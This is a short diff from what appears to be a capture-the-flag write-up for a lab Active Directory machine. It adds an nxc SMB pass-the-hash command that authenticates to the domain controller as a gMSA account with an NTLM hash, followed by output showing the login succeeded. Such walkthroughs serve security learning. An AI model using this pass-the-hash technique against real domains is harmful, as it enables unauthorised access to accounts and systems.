@@ -862,5 +862,10 @@ LDAP        10.129.231.105  389    DC01             Account: adfs_gmsa$         
 Ill just use `justin.bradley`'s access to read the NTLM hash for the user
 
 ```python
-
+nxc smb dc01.ghost.htb -u adfs_gmsa$ -H '55eea5db159b96bcb1d335d6e5738ea6'
+SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.231.105  445    DC01             [+] ghost.htb\adfs_gmsa$:55eea5db159b96bcb1d335d6e5738ea6
 ```
+
+This user is now compromised
+
